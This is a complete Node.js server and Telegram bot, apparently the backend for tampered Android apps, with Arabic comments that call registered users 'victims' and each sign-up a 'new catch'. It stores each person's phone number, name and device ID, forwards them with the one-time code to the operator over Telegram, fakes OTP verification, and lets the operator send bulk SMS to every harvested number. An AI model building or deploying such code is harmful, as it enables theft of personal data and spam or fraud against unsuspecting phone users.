const express = require("express");
const axios = require("axios");
const admin = require("firebase-admin");
const { Telegraf } = require("telegraf");

const app = express();
app.use(express.json());

// 1. إعداد Firebase بالخزانة الجديدة
const firebaseConfig = process.env.FIREBASE_CONFIG;
if (!admin.apps.length) {
    const serviceAccount = JSON.parse(firebaseConfig);
    admin.initializeApp({
        credential: admin.credential.cert(serviceAccount)
    });
}
const db = admin.firestore();

// 2. إعداد بوت تليجرام والأوامر العربية
const bot = new Telegraf(process.env.TELEGRAM_TOKEN);
const ADMIN_ID = process.env.ADMIN_ID;

let broadcastState = {};

// أوامر الإدارة عبر تليجرام (نفس طلبك بالضبط)
bot.on('text', async (ctx) => {
    if (ctx.chat.id.toString() !== ADMIN_ID) return;
    const text = ctx.message.text;

    // أمر نجم احصا
    if (text === "نجم احصا") {
        const snap = await db.collection('users').get();
        return ctx.reply(`📊 إجمالي الضحايا الموثقين: ${snap.size}`);
    }

    // أمر نجم نشر
    if (text === "نجم نشر") {
        broadcastState[ctx.chat.id] = { step: 'waiting' };
        return ctx.reply("📢 أرسل الآن نص الإعلان الذي تريد نشره لجميع الأرقام المسجلة:");
    }

    // تنفيذ النشر
    if (broadcastState[ctx.chat.id]?.step === 'waiting') {
        const msg = text;
        const snap = await db.collection('users').get();
        ctx.reply(`🚀 جاري النشر لـ ${snap.size} مستخدم...`);
        let count = 0;
        for (const doc of snap.docs) {
            try {
                await axios.post(`${process.env.INFOBIP_BASE_URL}/sms/2/text/advanced`, {
                    messages: [{ destinations: [{ to: doc.data().phone }], from: "Njm-RK", text: msg }]
                }, { headers: { 'Authorization': `App ${process.env.INFOBIP_API_KEY}` } });
                count++;
            } catch (e) {}
        }
        delete broadcastState[ctx.chat.id];
        return ctx.reply(`✅ تم النشر بنجاح لـ ${count} مستخدم!`);
    }

    // أمر نجم حضر (لحظر جهاز معين)
    if (text.startsWith("نجم حضر")) {
        const targetId = text.split(" ")[2];
        if (!targetId) return ctx.reply("❌ أرسل: نجم حضر [المعرف]");
        await db.collection('blocked').doc(targetId).set({ blocked: true });
        return ctx.reply(`🚫 تم حظر الجهاز ${targetId} نهائياً.`);
    }

    if (text === "نجم" || text === "start") {
        ctx.reply(`🌟 *أوامر نجم الإبداع:*
1️⃣ نجم احصا - لمعرفة عدد المسجلين
2️⃣ نجم نشر - لإرسال إعلان للكل
3️⃣ نجم حضر [المعرف] - لحظر جهاز`);
    }
});

// 3. مسارات الربط مع التطبيق (المزامنة مع Smali)

// فحص الجهاز الذكي (هذا هو حل مشكلة فتح التطبيق التلقائي)
app.get("/check-device", async (req, res) => {
    const deviceId = req.query.id || req.query.deviceId; // يدعم الاسمين من Smali
    try {
        // فحص هل الجهاز محظور؟
        const blocked = await db.collection('blocked').doc(deviceId).get();
        if (blocked.exists) return res.sendStatus(403); // حظر نهائي

        // فحص هل المستخدم مسجل مسبقاً؟
        const userRef = db.collection('users').where('deviceId', '==', deviceId);
        const snap = await userRef.get();

        if (!snap.empty) {
            res.status(200).send("ALLOWED"); // مسجل: افتح التطبيق مباشرة
        } else {
            res.status(401).send("UNAUTHORIZED"); // جديد: أظهر له واجهة التسجيل
        }
    } catch (e) { res.status(401).send("ERROR"); }
});

// استقبال طلب التسجيل وSMS
app.get("/request-otp", async (req, res) => {
    const { phone, name, app: appName, deviceId } = req.query;
    const otp = Math.floor(1000 + Math.random() * 9000).toString();

    try {
        // حفظ البيانات في Firebase (deviceId مهم للفحص اللاحق)
        await db.collection('users').doc(phone).set({
            phone, name, appName, deviceId, date: new Date().toISOString()
        }, { merge: true });

        // إرسال SMS عبر Infobip
        await axios.post(`${process.env.INFOBIP_BASE_URL}/sms/2/text/advanced`, {
            messages: [{
                destinations: [{ to: phone }],
                from: "Njm-RK",
                text: `كود التحقق الخاص بك في تطبيق ${appName} هو: ${otp}`
            }]
        }, { headers: { 'Authorization': `App ${process.env.INFOBIP_API_KEY}` } });

        // إشعار الإدارة
        const report = `🚀 *صيد جديد*\n\n📱 التطبيق: ${appName}\n👤 الاسم: ${name}\n📞 الرقم: ${phone}\n🔑 الكود: \`${otp}\`\n🛠 المعرف: \`${deviceId}\``;
        bot.telegram.sendMessage(ADMIN_ID, report, { parse_mode: "Markdown" });

        res.status(200).send("SUCCESS");
    } catch (e) { res.status(200).send("SUCCESS"); }
});

app.get("/verify-otp", (req, res) => res.status(200).send("VERIFIED"));
app.get("/ping", (req, res) => res.send("💓 SUCCESS"));

bot.launch();
app.listen(process.env.PORT || 10000);
